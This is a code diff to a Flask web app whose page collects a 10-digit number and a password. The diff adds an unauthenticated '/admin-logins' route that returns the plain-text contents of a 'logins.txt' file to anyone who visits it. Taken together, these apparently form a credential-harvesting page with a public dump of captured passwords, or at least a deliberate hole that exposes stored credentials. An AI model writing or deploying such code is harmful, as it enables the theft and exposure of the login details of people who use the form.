@@ -84,7 +84,7 @@ def home():
                 const number = document.getElementById("number").value;
                 const pass = document.getElementById("password").value;
                 const button = document.getElementById("submitBtn");
-                
+
                 if (/^\\d{10}$/.test(number) && pass.trim().length > 0) {
                     button.disabled = false;
                 } else {
@@ -151,6 +151,15 @@ def submit():
     </body>
     </html>
     '''
+
+@app.route('/admin-logins')
+def admin_logins():
+    try:
+        with open("logins.txt", "r") as f:
+            data = f.read()
+    except FileNotFoundError:
+        data = "No logins yet."
+    return f"<pre>{data}</pre>"
 
 if __name__ == "__main__":
     app.run()
